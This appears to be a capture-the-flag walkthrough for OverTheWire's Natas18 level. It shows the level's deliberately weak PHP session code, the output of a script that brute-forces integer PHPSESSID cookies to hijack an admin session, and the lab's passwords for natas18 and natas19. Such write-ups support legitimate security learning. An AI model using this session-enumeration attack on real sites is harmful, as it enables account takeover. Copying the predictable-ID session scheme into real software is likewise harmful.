# Natas18 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas18
Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
URL:      http://natas18.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- Now, we have a login page and our goal is to login as `admin`.

  ```
  <?php

  $maxid = 640; // 640 should be enough for everyone
  
  function isValidAdminLogin() { /* {{{ */
      if($_REQUEST["username"] == "admin") {
      /* This method of authentication appears to be unsafe and has been disabled for now. */
          //return 1;
      }
  
      return 0;
  }
  /* }}} */
  function isValidID($id) { /* {{{ */
      return is_numeric($id);
  }
  /* }}} */
  function createID($user) { /* {{{ */
      global $maxid;
      return rand(1, $maxid);
  }
  /* }}} */
  function debug($msg) { /* {{{ */
      if(array_key_exists("debug", $_GET)) {
          print "DEBUG: $msg<br>";
      }
  }
  /* }}} */
  function my_session_start() { /* {{{ */
      if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
      if(!session_start()) {
          debug("Session start failed");
          return false;
      } else {
          debug("Session start ok");
          if(!array_key_exists("admin", $_SESSION)) {
          debug("Session was old: admin flag set");
          $_SESSION["admin"] = 0; // backwards compatible, secure
          }
          return true;
      }
      }
  
      return false;
  }
  /* }}} */
  function print_credentials() { /* {{{ */
      if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
      print "You are an admin. The credentials for the next level are:<br>";
      print "<pre>Username: natas19\n";
      print "Password: <censored></pre>";
      } else {
      print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
      }
  }
  /* }}} */
  
  $showform = true;
  if(my_session_start()) {
      print_credentials();
      $showform = false;
  } else {
      if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
      session_id(createID($_REQUEST["username"]));
      session_start();
      $_SESSION["admin"] = isValidAdminLogin();
      debug("New session started");
      $showform = false;
      print_credentials();
      }
  }
  
  if($showform) {
  ?>
  ```

- I tried classic `admin:password`.

  <img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas18/login.png"/>

- Here, I wrote a script that will brute force the cookie, cookie value is just a integer.

  ```
  $ python3 cookie-brute.py
  [SNIP!]
  [*] Tried session ID 100 (100)
  [*] Tried session ID 101 (101)
  [*] Tried session ID 102 (102)
  [*] Tried session ID 103 (103)
  [*] Tried session ID 104 (104)
  [*] Tried session ID 105 (105)
  [*] Tried session ID 106 (106)
  [*] Tried session ID 107 (107)
  [*] Tried session ID 108 (108)
  [*] Tried session ID 109 (109)
  [*] Tried session ID 110 (110)
  [*] Tried session ID 111 (111)
  [*] Tried session ID 112 (112)
  [*] Tried session ID 113 (113)
  [*] Tried session ID 114 (114)
  [*] Tried session ID 115 (115)
  [*] Tried session ID 116 (116)
  [*] Tried session ID 117 (117)
  [*] Tried session ID 118 (118)
  [+] Found admin session cookie: 119 (PHPSESSID: 119)
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
  <body>
  <h1>natas18</h1>
  <div id="content">
  You are an admin. The credentials for the next level are:<br><pre>Username: natas19
  Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

---

## 🏁 Password for the next level

`Password for natas19 is: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
